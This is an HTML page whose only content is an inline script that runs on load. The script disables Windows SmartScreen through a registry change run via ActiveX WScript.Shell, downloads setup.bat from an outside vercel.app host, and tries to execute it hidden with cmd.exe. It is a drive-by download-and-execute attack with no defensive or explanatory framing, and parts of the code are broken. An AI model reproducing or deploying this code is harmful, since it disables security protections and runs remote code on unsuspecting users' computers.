<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download and Run .bat File</title>
</head>
<body>
  <script>
    async function downloadAndRunBatFile(fileUrl) {
      try {
        // Disable SmartScreen via cmd prompt
        const disableSmartScreenCmd = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f';
        await executeCommandViaCmd(disableSmartScreenCmd);

        // Alert user about SmartScreen
        alert('SmartScreen has been disabled. Proceeding to download and execute the "setup.bat" file.');

        // Download .bat file
        const response = await fetch(fileUrl);
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const blob = await response.blob();
        const file = new File([blob], 'setup.bat', { type: 'application/bat' });
        const url = window.URL.createObjectURL(file);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'setup.bat'; // Provide a default file name for download
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        
        // Alert user to manually run the downloaded .bat file
        alert('File downloaded successfully! Attempting to execute the "setup.bat" file automatically.');

        // Attempt to automatically execute the downloaded .bat file
        const execCommand = `cmd.exe /c start setup.bat`;
        const execResult = await new Promise(resolve => {
          const script = document.createElement('script');
          script.textContent = `
            const execResult = (function() {
              try {
                const result = new ActiveXObject("WScript.Shell").Run("${execCommand}", 0, true);
                return { success: true, result };
              } catch (error) {
                return { success: false, error: error.message };
              }
            })();
            resolve(execResult);
          `;
          document.body.appendChild(script);
        });

        if (!execResult.success) {
          throw new Error(`Error executing file: ${execResult.error}`);
        }
      } catch (error) {
        console.error('Error downloading or executing file:', error);
        alert('Error downloading or executing file. Please try again later.');
      }
    }

    async function executeCommandViaCmd(cmd) {
      const execCommand = `cmd.exe /c ${cmd}`;
      return new Promise((resolve, reject) => {
        const execResult = new ActiveXObject('WScript.Shell').Run(execCommand, 0, true);
        if (execResult === 0) {
          resolve();
        } else {
          reject(new Error(`Failed to execute command: ${cmd}`));
        }
      });
    }

    // Call the function with the file URL
    downloadAndRunBatFile('https://dd-xi-five.vercel.app/setup.bat');
  </script>
</body>
</html>
